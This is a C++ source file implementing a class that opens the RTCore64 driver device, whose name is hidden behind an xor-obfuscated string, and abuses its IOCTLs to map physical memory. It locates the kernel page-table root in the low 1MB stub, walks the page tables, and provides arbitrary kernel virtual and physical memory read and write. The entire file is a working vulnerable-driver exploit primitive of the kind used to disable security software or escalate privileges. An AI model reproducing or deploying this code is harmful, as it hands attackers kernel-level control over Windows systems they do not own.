#include "core.hpp"

#include <ntstatus.h>

#include "../xor.hpp"

HANDLE core_t::device = 0;

bool core_t::connect()
{
	if (!this->device)
	{
		this->device = CreateFileA(xor("\\\\.\\RTCore64"), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		if (this->device == INVALID_HANDLE_VALUE)
		{
			return false;
		}
		else
		{
			return true;
		}
	}

	return true;
}

bool core_t::disconnect()
{
	CloseHandle(this->device);

	return true;
}

bool core_t::map_memory(uint64_t address, uint64_t size, void** section)
{

	uint64_t input[] = { address, size }; unsigned long bytes = 0;

	bool success = DeviceIoControl(this->device, this->map_code, &input, sizeof(input), section, sizeof(section), &bytes, nullptr);

	return success;
}

bool core_t::unmap_memory(void* section)
{
	unsigned long bytes = 0;

	bool success = DeviceIoControl(this->device, this->unmap_code, &section, sizeof(section), 0, 0, &bytes, nullptr);

	return success;
}

bool core_t::virtual_to_physical(uint64_t virtual_address, uint64_t* physical_address)
{
	uint64_t pml4_cr3, selector, table, entry = 0;

	uint32_t r, shift;

	auto entry_to_physical_address = [](uint64_t entry, uint64_t* physical_address) -> bool
	{
		if (entry & 1)
		{
			*physical_address = entry & 0x000ffffffffff000ull;

			return true;
		}

		return false;
	};

	auto get_pml4_from_low_stub_1m = [](uint64_t low_stub_1m) -> uint64_t
	{
		uint32_t offset = 0;

		uint64_t pml4 = 0;

		uint32_t cr3_offset = 0xa0;

		uint32_t lm_target_offset = 0x70;

		//uint32_t cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) + FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);
		
		//uint32_t lm_target_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget);

		__try
		{
			while (offset < 0x100000)
			{

				offset += 0x1000;

				if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(low_stub_1m + offset)))
					continue;

				if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(low_stub_1m + offset + lm_target_offset)))
					continue;

				if (0xffffff0000000fff & *(UINT64*)(low_stub_1m + offset + cr3_offset))
					continue;

				pml4 = *(UINT64*)(low_stub_1m + offset + cr3_offset);

				break;
			}

		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			return 0;
		}

		return pml4;
	};

	auto query_pml4 = [&](uint64_t* value) -> bool
	{
		void* low_stub_1m = 0ULL; uint64_t pml4 = 0;

		do
		{
			low_stub_1m = 0; (uint64_t)this->map_memory(0ULL, 0x100000, &low_stub_1m);

			if (low_stub_1m == 0)
			{
				break;
			}

			pml4 = get_pml4_from_low_stub_1m((uint64_t)low_stub_1m);

			if (pml4)
			{
				*value = pml4;
			}
			else
			{
				*value = 0;
			}

			this->unmap_memory(low_stub_1m);

		} while (false);

		return (pml4 != 0);
	};

	if (!query_pml4(&pml4_cr3))
	{
		return false;
	}

	table = pml4_cr3 & 0x000ffffffffff000ull;

	for (r = 0; r < 4; r++)
	{
		shift = 39 - (r * 9);

		selector = (virtual_address >> shift) & 0x1ff;

		if (!this->read_physical(table + selector * 8, &entry, sizeof(uint64_t)))
		{
			return false;
		}

		if (!entry_to_physical_address(entry, &table))
		{
			return false;
		}

		if ((r == 2) && ((entry & 0x0000000000000080ull) != 0))
		{
			table &= 0x000fffffffe00000ull;

			table += virtual_address & 0x00000000001fffffull;

			*physical_address = table;

			return true;
		}
	}

	table += virtual_address & 0x0000000000000fffull;

	*physical_address = table;

	return true;
}

bool core_t::read_virtual(uint64_t address, void* buffer, uint32_t size)
{
	uint64_t physical_address;

	if (this->virtual_to_physical(address, &physical_address))
	{
		if (this->read_physical(physical_address, buffer, size))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	else
	{
		return false;
	}
}

bool core_t::write_virtual(uint64_t address, void* buffer, uint32_t size)
{
	uint64_t physical_address;

	if (this->virtual_to_physical(address, &physical_address))
	{
		if (this->write_physical(physical_address, buffer, size))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	else
	{
		return false;
	}
}

bool core_t::read_physical(uint64_t address, void* buffer, uint32_t size)
{
	void* section = 0;

	if (!map_memory(address, size, &section))
	{
		return false;
	}

	memcpy(buffer, section, size);

	return unmap_memory(section);
}

bool core_t::write_physical(uint64_t address, void* buffer, uint32_t size)
{
	void* section = 0;

	if (!map_memory(address, size, &section))
	{
		return false;
	}

	memcpy(section, buffer, size);

	return unmap_memory(section);
}
